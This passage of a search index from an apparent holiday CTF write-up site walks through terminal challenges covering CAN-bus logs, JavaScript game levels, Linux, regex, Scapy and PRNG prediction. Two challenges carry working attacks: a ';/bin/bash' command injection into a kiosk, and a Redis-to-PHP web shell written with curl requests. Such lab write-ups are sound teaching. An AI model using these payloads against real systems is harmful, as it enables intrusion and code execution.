commands to extract the file 15 lines at a time: sed -n 1,15p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 15,30p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 30,45p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 45,60p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 60-75p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt If you have a bigger display you can simply run cat NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt You can see the following people attended the meeting: You can see the following people voted in the meeting: The person who attended the meeting but did not vote is Tanta Kringle .","title":"Walk-through"},{"location":"obj/objective9/#answer","text":"Tanta Kringle","title":"Answer"},{"location":"terminal/canbus/","text":"Terminal - CAN-Bus Investigation \u00b6 Terminal \u00b6 Elf: Wunorse Openslae Location: Talks level Related to Objective: 7 The goal of this terminal challenge is to teach you about CAN BUS system. There is a good talk about this system. A useful screenshot from this talk is below: To solve this, you need to grep the noise out to find the unique lock/unlock sequence. In the log file, there are a lot of 188 and 244 codes. To grep these out use the following command: grep -vE \"(244\\#)|(188\\#)\" candump.log The results will be the following: You know there was a lock, unlock, lock sequence sent to the system, which aligns with the above results. Answer \u00b6 Here are the answers to this terminal challenge: 122520","title":"CAN-Bus Investigation"},{"location":"terminal/canbus/#terminal-can-bus-investigation","text":"","title":"Terminal - CAN-Bus Investigation"},{"location":"terminal/canbus/#terminal","text":"Elf: Wunorse Openslae Location: Talks level Related to Objective: 7 The goal of this terminal challenge is to teach you about CAN BUS system. There is a good talk about this system. A useful screenshot from this talk is below: To solve this, you need to grep the noise out to find the unique lock/unlock sequence. In the log file, there are a lot of 188 and 244 codes. To grep these out use the following command: grep -vE \"(244\\#)|(188\\#)\" candump.log The results will be the following: You know there was a lock, unlock, lock sequence sent to the system, which aligns with the above results.","title":"Terminal"},{"location":"terminal/canbus/#answer","text":"Here are the answers to this terminal challenge: 122520","title":"Answer"},{"location":"terminal/elfcode/","text":"Terminal - Programming Concepts (The ELF C0DE) \u00b6 Terminal \u00b6 Elf: Ribb Bonbowford Location: Dining Room Related to Objective: The goal of this terminal game challenge is to teach you programming concepts and JavaScript. There are a lot of hints offered for this challenge that can be accessed in the hint section. When you click on the game console, you're greeted with an introduction to the game. There are 8 levels for this game. At each level, you need to write JavaScript code to collect lollipops and finish the game. In the levels, there are different obstacles you need to avoid. Level 1 \u00b6 Here is the code for level 1: elf . moveLeft ( 10 ) elf . moveUp ( 10 ) Level 2 - Trigger The Yeeter \u00b6 Here is the code for level 2: elf . moveLeft ( 6 ) var sum = elf . get_lever ( 0 ) + 2 elf . pull_lever ( sum ) elf . moveLeft ( 4 ) elf . moveUp ( 10 ) Level 3 - Move to Loopiness \u00b6 Here is the code for level 3: for ( var i = 0 ; i < 3 ; i ++ ) { elf . moveTo ( lollipop [ i ]) } elf . moveUp ( 1 ) Level 4 - Up Down Loopiness \u00b6 Here is the code for level 4: for ( var i = 0 ; i < 3 ; i ++ ) { elf . moveLeft ( 3 ) elf . moveUp ( 11 ) elf . moveLeft ( 3 ) elf . moveDown ( 11 ) } Level 5 - Move To Madness \u00b6 Here is the code for level 5: elf . moveTo ( lollipop [ 1 ]); elf . moveTo ( lollipop [ 0 ]); var array = elf . ask_munch ( 0 ); var result = array . filter ( d => typeof d === 'number' ); elf . tell_munch ( result ); elf . moveUp ( 2 ); Level 6 - Two Paths, Your Choice \u00b6 Here is the code for level 6: for ( var i = 0 ; i < 4 ; i ++ ) { elf . moveTo ( lollipop [ i ]); } elf . moveTo ( munchkin [ 0 ]); var JSON_Obj = elf . ask_munch ( 0 ); for ( key in JSON_Obj ) { if ( JSON_Obj [ key ] == \"lollipop\" ) { elf . tell_munch ( key ); } } elf . moveUp ( 2 ); This was the last level, but there are some bonus levels!!! Level 7 - Yeeter Swirl (Bonus Level) \u00b6 Here is the code for level 7: var x = 0 , y = 0 ; for ( var i = 0 ; i < 2 ; i ++ ) { elf . moveDown ( ++ x ); y = pull ( y ) elf . moveLeft ( ++ x ); y = pull ( y ) elf . moveUp ( ++ x ); y = pull ( y ) elf . moveRight ( ++ x ); y = pull ( y ) } elf . moveUp ( 2 ); elf . moveLeft ( 4 ); elf . tell_munch ( TotalSum ) elf . moveUp ( 2 ); function pull ( l ){ elf . pull_lever ( l ++ ); return l ; } function TotalSum ( p1 ) { var total = 0 ; for ( i in p1 ) { p1 [ i ] = p1 [ i ]. filter ( d => typeof d === 'number' ); p1 [ i ] = p1 [ i ]. reduce (( a , b ) => a + b ); total += parseInt ( p1 [ i ]); } return total ; } Compress the code so that it fits in the game console limits: for ( var x = 0 , y = 0 , i = 0 ; 2 > i ; i ++ ) elf . moveDown ( ++ x ), y = pull ( y ), elf . moveLeft ( ++ x ), y = pull ( y ), elf . moveUp ( ++ x ), y = pull ( y ), elf . moveRight ( ++ x ), y = pull ( y ); elf . moveUp ( 2 ), elf . moveLeft ( 4 ), elf . tell_munch ( TotalSum ), elf . moveUp ( 2 ); function pull ( a ){ return elf . pull_lever ( a ++ ), a } function TotalSum ( a ){ var b = 0 ; for ( i in a ) a [ i ] = a [ i ]. filter ( a => \"number\" == typeof a ), a [ i ] = a [ i ]. reduce (( c , a )=> c + a ), b += parseInt ( a [ i ]); return b } Level 8 - For Loop Finale (Bonus Level) \u00b6 Here is the code for level 8: var sum1 = 0 ; elf . moveRight ( 1 ); for ( var i = 0 ; i < 6 ; i ++ ) { sum1 = movegetpull_lever ( i , sum1 ); } function movegetpull_lever ( p , s ) { var t_sum = 0 ; t_sum = s + elf . get_lever ( p ); elf . pull_lever ( t_sum ); elf . moveUp ( 2 ); var JSON_Obj = elf . ask_munch ( 0 ); //ask munch each time you pass the pit elf . tell_munch ( Munchkin_function ); //tell munch each time you pass the pit, just incase he is waiting if ( p % 2 == 0 ) { elf . moveLeft ( 3 + 2 * p ); } else { elf . moveRight ( 3 + 2 * p ); } return ( t_sum ); } function Munchkin_function ( p1 ) { for ( array in p1 ) { for ( key in p1 [ array ]) { if ( p1 [ array ][ key ] == \"lollipop\" ) { return key ; } } } return 0 ; } After you complete the game you receive the following message: Answer \u00b6 The answers for this challenge are shown above.","title":"Programming Concepts (The ELF C0DE)"},{"location":"terminal/elfcode/#terminal-programming-concepts-the-elf-c0de","text":"","title":"Terminal - Programming Concepts (The ELF C0DE)"},{"location":"terminal/elfcode/#terminal","text":"Elf: Ribb Bonbowford Location: Dining Room Related to Objective: The goal of this terminal game challenge is to teach you programming concepts and JavaScript. There are a lot of hints offered for this challenge that can be accessed in the hint section. When you click on the game console, you're greeted with an introduction to the game. There are 8 levels for this game. At each level, you need to write JavaScript code to collect lollipops and finish the game. In the levels, there are different obstacles you need to avoid.","title":"Terminal"},{"location":"terminal/elfcode/#level-1","text":"Here is the code for level 1: elf . moveLeft ( 10 ) elf . moveUp ( 10 )","title":"Level 1"},{"location":"terminal/elfcode/#level-2-trigger-the-yeeter","text":"Here is the code for level 2: elf . moveLeft ( 6 ) var sum = elf . get_lever ( 0 ) + 2 elf . pull_lever ( sum ) elf . moveLeft ( 4 ) elf . moveUp ( 10 )","title":"Level 2 - Trigger The Yeeter"},{"location":"terminal/elfcode/#level-3-move-to-loopiness","text":"Here is the code for level 3: for ( var i = 0 ; i < 3 ; i ++ ) { elf . moveTo ( lollipop [ i ]) } elf . moveUp ( 1 )","title":"Level 3 - Move to Loopiness"},{"location":"terminal/elfcode/#level-4-up-down-loopiness","text":"Here is the code for level 4: for ( var i = 0 ; i < 3 ; i ++ ) { elf . moveLeft ( 3 ) elf . moveUp ( 11 ) elf . moveLeft ( 3 ) elf . moveDown ( 11 ) }","title":"Level 4 - Up Down Loopiness"},{"location":"terminal/elfcode/#level-5-move-to-madness","text":"Here is the code for level 5: elf . moveTo ( lollipop [ 1 ]); elf . moveTo ( lollipop [ 0 ]); var array = elf . ask_munch ( 0 ); var result = array . filter ( d => typeof d === 'number' ); elf . tell_munch ( result ); elf . moveUp ( 2 );","title":"Level 5 - Move To Madness"},{"location":"terminal/elfcode/#level-6-two-paths-your-choice","text":"Here is the code for level 6: for ( var i = 0 ; i < 4 ; i ++ ) { elf . moveTo ( lollipop [ i ]); } elf . moveTo ( munchkin [ 0 ]); var JSON_Obj = elf . ask_munch ( 0 ); for ( key in JSON_Obj ) { if ( JSON_Obj [ key ] == \"lollipop\" ) { elf . tell_munch ( key ); } } elf . moveUp ( 2 ); This was the last level, but there are some bonus levels!!!","title":"Level 6 - Two Paths, Your Choice"},{"location":"terminal/elfcode/#level-7-yeeter-swirl-bonus-level","text":"Here is the code for level 7: var x = 0 , y = 0 ; for ( var i = 0 ; i < 2 ; i ++ ) { elf . moveDown ( ++ x ); y = pull ( y ) elf . moveLeft ( ++ x ); y = pull ( y ) elf . moveUp ( ++ x ); y = pull ( y ) elf . moveRight ( ++ x ); y = pull ( y ) } elf . moveUp ( 2 ); elf . moveLeft ( 4 ); elf . tell_munch ( TotalSum ) elf . moveUp ( 2 ); function pull ( l ){ elf . pull_lever ( l ++ ); return l ; } function TotalSum ( p1 ) { var total = 0 ; for ( i in p1 ) { p1 [ i ] = p1 [ i ]. filter ( d => typeof d === 'number' ); p1 [ i ] = p1 [ i ]. reduce (( a , b ) => a + b ); total += parseInt ( p1 [ i ]); } return total ; } Compress the code so that it fits in the game console limits: for ( var x = 0 , y = 0 , i = 0 ; 2 > i ; i ++ ) elf . moveDown ( ++ x ), y = pull ( y ), elf . moveLeft ( ++ x ), y = pull ( y ), elf . moveUp ( ++ x ), y = pull ( y ), elf . moveRight ( ++ x ), y = pull ( y ); elf . moveUp ( 2 ), elf . moveLeft ( 4 ), elf . tell_munch ( TotalSum ), elf . moveUp ( 2 ); function pull ( a ){ return elf . pull_lever ( a ++ ), a } function TotalSum ( a ){ var b = 0 ; for ( i in a ) a [ i ] = a [ i ]. filter ( a => \"number\" == typeof a ), a [ i ] = a [ i ]. reduce (( c , a )=> c + a ), b += parseInt ( a [ i ]); return b }","title":"Level 7 - Yeeter Swirl (Bonus Level)"},{"location":"terminal/elfcode/#level-8-for-loop-finale-bonus-level","text":"Here is the code for level 8: var sum1 = 0 ; elf . moveRight ( 1 ); for ( var i = 0 ; i < 6 ; i ++ ) { sum1 = movegetpull_lever ( i , sum1 ); } function movegetpull_lever ( p , s ) { var t_sum = 0 ; t_sum = s + elf . get_lever ( p ); elf . pull_lever ( t_sum ); elf . moveUp ( 2 ); var JSON_Obj = elf . ask_munch ( 0 ); //ask munch each time you pass the pit elf . tell_munch ( Munchkin_function ); //tell munch each time you pass the pit, just incase he is waiting if ( p % 2 == 0 ) { elf . moveLeft ( 3 + 2 * p ); } else { elf . moveRight ( 3 + 2 * p ); } return ( t_sum ); } function Munchkin_function ( p1 ) { for ( array in p1 ) { for ( key in p1 [ array ]) { if ( p1 [ array ][ key ] == \"lollipop\" ) { return key ; } } } return 0 ; } After you complete the game you receive the following message:","title":"Level 8 - For Loop Finale (Bonus Level)"},{"location":"terminal/elfcode/#answer","text":"The answers for this challenge are shown above.","title":"Answer"},{"location":"terminal/greet/","text":"Terminal - Greeting Cards \u00b6 Terminal \u00b6 Elf: Chimney Scissorsticks Location: Talk Lobby Related to Objective: Link: https://greeting-cards.kringlecastle.com/ This is a terminal, but not a challenge (or maybe it is!). I know that it's not vulnerable to the same vulnerability in the Tag Generator. You can print your greeting cards here !!!","title":"Greeting Cards"},{"location":"terminal/greet/#terminal-greeting-cards","text":"","title":"Terminal - Greeting Cards"},{"location":"terminal/greet/#terminal","text":"Elf: Chimney Scissorsticks Location: Talk Lobby Related to Objective: Link: https://greeting-cards.kringlecastle.com/ This is a terminal, but not a challenge (or maybe it is!). I know that it's not vulnerable to the same vulnerability in the Tag Generator. You can print your greeting cards here !!!","title":"Terminal"},{"location":"terminal/kiosk/","text":"Terminal - Kringle Kiosk \u00b6 Terminal \u00b6 Elf: Shinny Upatree Location: Front Lawn Related to Objective: 2 The goal of this terminal challenge is to teach you about Command Injections. To complete this challenge, you need to get a shell on the terminal. Playing with different special characters you will quickly find that you can perform command injections using ; when selecting option 4. Answer \u00b6 Here are the answers to this terminal challenge Select option 4, then type ;/bin/bash . Once you solve it, Shinny Upatree tells you this:","title":"Kringle Kiosk"},{"location":"terminal/kiosk/#terminal-kringle-kiosk","text":"","title":"Terminal - Kringle Kiosk"},{"location":"terminal/kiosk/#terminal","text":"Elf: Shinny Upatree Location: Front Lawn Related to Objective: 2 The goal of this terminal challenge is to teach you about Command Injections. To complete this challenge, you need to get a shell on the terminal. Playing with different special characters you will quickly find that you can perform command injections using ; when selecting option 4.","title":"Terminal"},{"location":"terminal/kiosk/#answer","text":"Here are the answers to this terminal challenge Select option 4, then type ;/bin/bash . Once you solve it, Shinny Upatree tells you this:","title":"Answer"},{"location":"terminal/linux/","text":"Terminal - Linux Primer \u00b6 Terminal \u00b6 Elf: Sugarplum Mary Location: Courtyard Related to Objective: 3 The goal of this terminal challenge is to teach you the basics of Linux. It gets you to do things like ls, cat, etc... If you run into a challenge at any point, type hintme() for hints. Answer \u00b6 Here are the answers to this terminal challenge(in order): ls cat munchkin_19315479765589239 rm munchkin_19315479765589239 pwd ls -la history printenv cd workshop grep -iF \"munchkin\" * chmod 755 lollipop_engine lollipop_engine cd electrical mv blown_fuse0 fuse0 ln -s fuse0 fuse1 cp fuse1 fuse2 echo MUNCHKIN_REPELLENT >> fuse2 find /opt/munchkin_den/ -iname '*munchkin*' find /opt/munchkin_den/ -group munchkin find /opt/munchkin_den/ -size +108K -size -110K netstat -tulpn | grep LISTEN curl localhost:54321 ps -a ;(to find the process 14516_munchkin) kill <pid of 14516_munchkin> Once you solve it, Sugarplum Mary tells you this:","title":"Linux Primer"},{"location":"terminal/linux/#terminal-linux-primer","text":"","title":"Terminal - Linux Primer"},{"location":"terminal/linux/#terminal","text":"Elf: Sugarplum Mary Location: Courtyard Related to Objective: 3 The goal of this terminal challenge is to teach you the basics of Linux. It gets you to do things like ls, cat, etc... If you run into a challenge at any point, type hintme() for hints.","title":"Terminal"},{"location":"terminal/linux/#answer","text":"Here are the answers to this terminal challenge(in order): ls cat munchkin_19315479765589239 rm munchkin_19315479765589239 pwd ls -la history printenv cd workshop grep -iF \"munchkin\" * chmod 755 lollipop_engine lollipop_engine cd electrical mv blown_fuse0 fuse0 ln -s fuse0 fuse1 cp fuse1 fuse2 echo MUNCHKIN_REPELLENT >> fuse2 find /opt/munchkin_den/ -iname '*munchkin*' find /opt/munchkin_den/ -group munchkin find /opt/munchkin_den/ -size +108K -size -110K netstat -tulpn | grep LISTEN curl localhost:54321 ps -a ;(to find the process 14516_munchkin) kill <pid of 14516_munchkin> Once you solve it, Sugarplum Mary tells you this:","title":"Answer"},{"location":"terminal/modem/","text":"Terminal - 33.6kbps \u00b6 Terminal \u00b6 Elf: Fitzy Shortstack Location: Kitchen Related to Objective: 5 Link: handshake sequence The goal of this terminal challenge is to teach you about dial-up modem communications. The hint for this terminal challenge is available in the hint section. You need to listen to the provided handshake sequence in the objective. You need to establish a connection to the number provided by pressing the \"special\" sounds. Answer \u00b6 Here are the answers to this terminal challenge: Dial 756-8347 Baa DEE brr (Wait for response) Aaah WeWEwrwrrwrr beDURRdunditty SCHHRRHHTHRTR Once you solve it, Fitzy Shortstack you this:","title":"33.6kbps"},{"location":"terminal/modem/#terminal-336kbps","text":"","title":"Terminal - 33.6kbps"},{"location":"terminal/modem/#terminal","text":"Elf: Fitzy Shortstack Location: Kitchen Related to Objective: 5 Link: handshake sequence The goal of this terminal challenge is to teach you about dial-up modem communications. The hint for this terminal challenge is available in the hint section. You need to listen to the provided handshake sequence in the objective. You need to establish a connection to the number provided by pressing the \"special\" sounds.","title":"Terminal"},{"location":"terminal/modem/#answer","text":"Here are the answers to this terminal challenge: Dial 756-8347 Baa DEE brr (Wait for response) Aaah WeWEwrwrrwrr beDURRdunditty SCHHRRHHTHRTR Once you solve it, Fitzy Shortstack you this:","title":"Answer"},{"location":"terminal/redis/","text":"Terminal - Redis Bug Hunt \u00b6 Terminal \u00b6 Elf: Holly Evergreen Location: Kitchen Related to Objective: 8 The goal of this terminal challenge is to teach you about Redis RCE. To achieve RCE, you can write PHP code to execute a command. The PHP code needs to be encoded in URL encoding. Then you can use the following queries to run the URL encoded PHP code. curl http : // localhost / maintenance . php ? cmd = config , set , dir , \"/var/www/html\" curl http : // localhost / maintenance . php ? cmd = config , set , dbfilename , test1 . php curl http : // localhost / maintenance . php ? cmd = set , test1 , ####GET INDEX.PHP URL ENCODED COMMAND#### curl http : // localhost / maintenance . php ? cmd = save curl http : // localhost / test1 . php -- output blah . txt Here is PHP code to get index.php : <?php $output = shell_exec('cat index.php'); echo \"<pre>$output</pre>\"; ?> Use CyberChef to perform the URL encoding CyberChef . Here is the URL encoding for the above PHP code. You need to replace ####GET INDEX.PHP URL ENCODED COMMAND#### in the above code with the following: %3C%3Fphp%0A%24output%20%3D%20shell%5Fexec%28%27cat%20index%2Ephp%27%29%3B%0Aecho%20%22%3Cpre%3E%24output%3C%2Fpre%3E%22%3B%0A%3F%3E%0A Run the above curl queries and to get the following: Answer \u00b6 Here are the answers to this terminal challenge: curl http://localhost/maintenance.php?cmd=config,set,dir,\"/var/www/html\" curl http://localhost/maintenance.php?cmd=config,set,dbfilename,test1.php curl http://localhost/maintenance.php?cmd=set,test1,%3C%3Fphp%0A%24output%20%3D%20shell%5Fexec%28%27cat%20index%2Ephp%27%29%3B%0Aecho%20%22%3Cpre%3E%24output%3C%2Fpre%3E%22%3B%0A%3F%3E%0A curl http://localhost/maintenance.php?cmd=save curl http://localhost/test1.php --output blah.txt After you solve the challenge Holly tells you the following:","title":"Redis Bug hunt"},{"location":"terminal/redis/#terminal-redis-bug-hunt","text":"","title":"Terminal - Redis Bug Hunt"},{"location":"terminal/redis/#terminal","text":"Elf: Holly Evergreen Location: Kitchen Related to Objective: 8 The goal of this terminal challenge is to teach you about Redis RCE. To achieve RCE, you can write PHP code to execute a command. The PHP code needs to be encoded in URL encoding. Then you can use the following queries to run the URL encoded PHP code. curl http : // localhost / maintenance . php ? cmd = config , set , dir , \"/var/www/html\" curl http : // localhost / maintenance . php ? cmd = config , set , dbfilename , test1 . php curl http : // localhost / maintenance . php ? cmd = set , test1 , ####GET INDEX.PHP URL ENCODED COMMAND#### curl http : // localhost / maintenance . php ? cmd = save curl http : // localhost / test1 . php -- output blah . txt Here is PHP code to get index.php : <?php $output = shell_exec('cat index.php'); echo \"<pre>$output</pre>\"; ?> Use CyberChef to perform the URL encoding CyberChef . Here is the URL encoding for the above PHP code. You need to replace ####GET INDEX.PHP URL ENCODED COMMAND#### in the above code with the following: %3C%3Fphp%0A%24output%20%3D%20shell%5Fexec%28%27cat%20index%2Ephp%27%29%3B%0Aecho%20%22%3Cpre%3E%24output%3C%2Fpre%3E%22%3B%0A%3F%3E%0A Run the above curl queries and to get the following:","title":"Terminal"},{"location":"terminal/redis/#answer","text":"Here are the answers to this terminal challenge: curl http://localhost/maintenance.php?cmd=config,set,dir,\"/var/www/html\" curl http://localhost/maintenance.php?cmd=config,set,dbfilename,test1.php curl http://localhost/maintenance.php?cmd=set,test1,%3C%3Fphp%0A%24output%20%3D%20shell%5Fexec%28%27cat%20index%2Ephp%27%29%3B%0Aecho%20%22%3Cpre%3E%24output%3C%2Fpre%3E%22%3B%0A%3F%3E%0A curl http://localhost/maintenance.php?cmd=save curl http://localhost/test1.php --output blah.txt After you solve the challenge Holly tells you the following:","title":"Answer"},{"location":"terminal/scapy/","text":"Terminal - Scapy Prepper \u00b6 Terminal \u00b6 Elf: Alabaster Snowball Location: Roof/Netwars Related to Objective: 9 The goal of this terminal challenge is to teach you a little about networking and crafting packets. You get various tasks that you need to complete using scapy. Scapy documentation is very helpful for this task. If you run into a challenge, use the command task.help() to get hints. Answer \u00b6 Here are the answers for this challenge in order: task.submit(send) task.submit(sniff) task.submit(1) task.submit(rdpcap) task.submit(2) task.submit(UDP_PACKETS[0]) task.submit(TCP_PACKETs[1][TCP]) UDP_PACKETS[0][IP].src = \"127.0.0.1\" task.submit(UDP_PACKETS[0]) task.submit(\"echo\") task.submit(ICMP_PACKETS[1][ICMP].chksum) task.submit(3) packet=IP(dst=\"127.127.127.127\")/UDP(dport=5000) task.submit(packet) dns_query = IP (dat=\"127.2.3.4\")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=elveslove.santa\")) task.submit(dns_query) ARP_PACKETS[1][ARP].hwdst=\"00:16:ce:6e:8b:24\" ARP_PACKETS[1][ARP].hwsrc=\"00:13:46:0b:22:ba\" ARP_PACKETS[1][ARP]=2 task.submit(ARP_PACKETS) After you complete the challenge, Alabaster Snowball tells you the following: Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa.","title":"Scapy Prepper"},{"location":"terminal/scapy/#terminal-scapy-prepper","text":"","title":"Terminal - Scapy Prepper"},{"location":"terminal/scapy/#terminal","text":"Elf: Alabaster Snowball Location: Roof/Netwars Related to Objective: 9 The goal of this terminal challenge is to teach you a little about networking and crafting packets. You get various tasks that you need to complete using scapy. Scapy documentation is very helpful for this task. If you run into a challenge, use the command task.help() to get hints.","title":"Terminal"},{"location":"terminal/scapy/#answer","text":"Here are the answers for this challenge in order: task.submit(send) task.submit(sniff) task.submit(1) task.submit(rdpcap) task.submit(2) task.submit(UDP_PACKETS[0]) task.submit(TCP_PACKETs[1][TCP]) UDP_PACKETS[0][IP].src = \"127.0.0.1\" task.submit(UDP_PACKETS[0]) task.submit(\"echo\") task.submit(ICMP_PACKETS[1][ICMP].chksum) task.submit(3) packet=IP(dst=\"127.127.127.127\")/UDP(dport=5000) task.submit(packet) dns_query = IP (dat=\"127.2.3.4\")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=elveslove.santa\")) task.submit(dns_query) ARP_PACKETS[1][ARP].hwdst=\"00:16:ce:6e:8b:24\" ARP_PACKETS[1][ARP].hwsrc=\"00:13:46:0b:22:ba\" ARP_PACKETS[1][ARP]=2 task.submit(ARP_PACKETS) After you complete the challenge, Alabaster Snowball tells you the following: Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa.","title":"Answer"},{"location":"terminal/snowball/","text":"Terminal - Snowball Game \u00b6 Terminal \u00b6 Elf: Tangle Coalbox Location: Speaker UNPreparedness Related to Objective: 11a, 11b Tangle Coalbox: Howdy gumshoe. I'm Tangle Coalbox, resident sleuth in the North Pole. If you're up for a challenge, I'd ask you to look at this here Snowball Game. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the Easy level, but the Impossible level is, well... I'd call it impossible, but I just saw someone beat it! I'm sure something's off here. Could it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an Easy game to cheat a bit. But on Impossible, the best you get are rejected player names in the page comments. Can you use those somehow? Check out Tom Liston's talk for more info, if you need it. In this terminal challenge, you will learn about random number generators, specifically the Mersenne Twisters. Based on the hints, you can load multiple versions of this game using the link Snowball2 . Easy and Medium Difficulties \u00b6 In these difficulties, you can pick your user name. If you start two games with the same number as the name, the game will have an identical starting position. The name is the seed for the random number generator. You can play multiple identical games to find the position of the enemy, without losing. Hard Difficulty \u00b6 In hard mode, you can't type your name. The game picks a random number to seed the game. However, it prints the seed number as your name in the game. You can use this number to play the game in easy mode in multiple browsers. Impossible Difficulty \u00b6 In this difficulty, you can't select or view your name in the game. Look at the game HTML code for the Impossible Difficulty. At the bottom of the HTML code, there is a list of 624 random numbers. Amazingly enough, this is the exact number of random numbers you need to use the Mersenne Twisters predictor! Copy the numbers at the end of the page. Create a python array with these numbers (using notepad++ and Regex), ex. array = [#,#,...#]. Download the Mersenne Twisters predictor from here . Update the main function of the code to add the array. myprng = mt19937 ( 0 ) array = [ #,#,...#] for i in range ( mt19937 . n ): myprng . MT [ i ] = untemper ( array [ i ]) print ( \"next random number:\" , myprng . extract_number ()) This will print the random number seed for your impossible level. Grab the number and beat the game in the easy difficulty. Use the pattern you discover in the easy mode to win the impossible mode. Answer \u00b6 Here are the answers to this challenge in order: Use the Mersenne Twisters predictor and the 624 random numbers in the game source to predict the random seed for the game's starting position. Use this random number to win the game in easy difficulty. Winning the game in easy will reveal the enemy position in the impossible difficulty.","title":"Snowball Game"},{"location":"terminal/snowball/#terminal-snowball-game","text":"","title":"Terminal - Snowball Game"},{"location":"terminal/snowball/#terminal","text":"Elf: Tangle Coalbox Location: Speaker UNPreparedness Related to Objective: 11a, 11b Tangle Coalbox: Howdy gumshoe. I'm Tangle Coalbox, resident sleuth in the North Pole. If you're up for a challenge, I'd ask you to look at this here Snowball Game. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the Easy level, but the Impossible level is, well... I'd call it impossible, but I just saw someone beat it! I'm sure something's off here. Could it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an Easy game to cheat a bit. But on Impossible, the best you get are rejected player names in the page comments. Can you use those somehow? Check out Tom Liston's talk for more info, if you need it. In this terminal challenge, you will learn about random number generators, specifically the Mersenne Twisters. Based on the hints, you can load multiple versions of this game using the link Snowball2 .","title":"Terminal"},{"location":"terminal/snowball/#easy-and-medium-difficulties","text":"In these difficulties, you can pick your user name. If you start two games with the same number as the name, the game will have an identical starting position. The name is the seed for the random number generator. You can play multiple identical games to find the position of the enemy, without losing.","title":"Easy and Medium Difficulties"},{"location":"terminal/snowball/#hard-difficulty","text":"In hard mode, you can't type your name. The game picks a random number to seed the game. However, it prints the seed number as your name in the game. You can use this number to play the game in easy mode in multiple browsers.","title":"Hard Difficulty"},{"location":"terminal/snowball/#impossible-difficulty","text":"In this difficulty, you can't select or view your name in the game. Look at the game HTML code for the Impossible Difficulty. At the bottom of the HTML code, there is a list of 624 random numbers. Amazingly enough, this is the exact number of random numbers you need to use the Mersenne Twisters predictor! Copy the numbers at the end of the page. Create a python array with these numbers (using notepad++ and Regex), ex. array = [#,#,...#]. Download the Mersenne Twisters predictor from here . Update the main function of the code to add the array. myprng = mt19937 ( 0 ) array = [ #,#,...#] for i in range ( mt19937 . n ): myprng . MT [ i ] = untemper ( array [ i ]) print ( \"next random number:\" , myprng . extract_number ()) This will print the random number seed for your impossible level. Grab the number and beat the game in the easy difficulty. Use the pattern you discover in the easy mode to win the impossible mode.","title":"Impossible Difficulty"},{"location":"terminal/snowball/#answer","text":"Here are the answers to this challenge in order: Use the Mersenne Twisters predictor and the 624 random numbers in the game source to predict the random seed for the game's starting position. Use this random number to win the game in easy difficulty. Winning the game in easy will reveal the enemy position in the impossible difficulty.","title":"Answer"},{"location":"terminal/sort/","text":"Terminal - SORT-O-MATIC \u00b6 Terminal \u00b6 Elf: Pepper Minstix Location: Front Lawn Related to Objective: 4 Link: regular expression cheat sheet , this regex test interface . The goal of this terminal challenge is to teach you about regular expression (Regex). The hint for this terminal challenge is available in the hint section. You need to write 8 Regex expressions to ensure toys are sorted into the correct groups, The Island of Misfits or Santa's Bag. Here are the 8 things you need to write a Regex for: Answer \u00b6 Here are the answers for each challenge: 1) Matches at least one digit \u00b6 \\d+ 2) Matches 3 alpha a-z characters ignoring case \u00b6 [a-zA-Z]{3} 3) Matches 2 chars of lowercase a-z or numbers \u00b6 [a-z \\d]{2,} 4) Matches any 2 chars not uppercase A-L or 1-5 \u00b6 [^A-L 1-5]{2,} 5) Matches three or more digits only \u00b6 \\b\\d{3,}\\b 6) Matches multiple hour:minute:second time formats only \u00b6 ^([0-5]\\d):([0-5]\\d):([0-5]\\d)$ 7) Matches MAC address format only while ignoring case \u00b6 \\b([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})\\b 8) Matches multiple day, month, and year date formats only \u00b6 \\b[0-3]\\d[/ . -][0-1]\\d[/ . -]\\d{4}\\b Once you complete the challenge you get the following message:","title":"SORT-O-MATIC"},{"location":"terminal/sort/#terminal-sort-o-matic","text":"","title":"Terminal - SORT-O-MATIC"},{"location":"terminal/sort/#terminal","text":"Elf: Pepper Minstix Location: Front Lawn Related to Objective: 4 Link: regular expression cheat sheet , this regex test interface . The goal of this terminal challenge is to teach you about regular expression (Regex). The hint for this terminal challenge is available in the hint section. You need to write 8 Regex expressions to ensure toys are sorted into the correct groups, The Island of Misfits or Santa's Bag. Here are the 8 things you need to write a Regex for:","title":"Terminal"},{"location":"terminal/sort/#answer","text":"Here are the answers for each challenge:","title":"Answer"},{"location":"terminal/sort/#1-matches-at-least-one-digit","text":"\\d+","title":"1) Matches at least one digit"},{"location":"terminal/sort/#2-matches-3-alpha-a-z-characters-ignoring-case","text":"[a-zA-Z]{3}","title":"2) Matches 3 alpha a-z characters ignoring case"},{"location":"terminal/sort/#3-matches-2-chars-of-lowercase-a-z-or-numbers","text":"[a-z \\d]{2,}","title":"3) Matches 2 chars of lowercase a-z or numbers"},{"location":"terminal/sort/#4-matches-any-2-chars-not-uppercase-a-l-or-1-5","text":"[^A-L 1-5]{2,}","title":"4) Matches any 2 chars not uppercase A-L or 1-5"},{"location":"terminal/sort/#5-matches-three-or-more-digits-only","text":"\\b\\d{3,}\\b","title":"5) Matches three or more digits only"},{"location":"terminal/sort/#6-matches-multiple-hourminutesecond-time-formats-only","text":"^([0-5]\\d):([0-5]\\d):([0-5]\\d)$","title":"6) Matches multiple 